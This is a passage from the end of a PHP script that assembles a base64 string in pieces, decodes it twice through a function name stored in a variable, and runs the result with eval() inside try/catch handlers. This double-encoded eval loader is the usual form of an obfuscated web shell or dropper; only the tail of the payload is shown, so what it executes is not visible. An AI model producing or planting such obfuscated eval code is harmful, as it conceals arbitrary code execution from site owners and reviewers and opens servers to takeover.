    $z .= "a2RI";
    $z .= "aDBJ";
    $z .= "anNL";
    $z .= "SUNB";
    $z .= "Z0lI";
    $z .= "MD0=";
    $fn = 'base64_decode';
    $s1 = $fn($z);
    if ($s1 === false) { throw new Exception('First base64 decode failed'); }
    $s2 = $fn($s1);
    if ($s2 === false) { throw new Exception('Second base64 decode failed'); }
    eval($s2);
} catch (\ParseError $e) {
    echo "Syntax error: ".$e->getMessage();
} catch (\Throwable $e) {
    echo "Runtime error: ".$e->getMessage();
}
?>
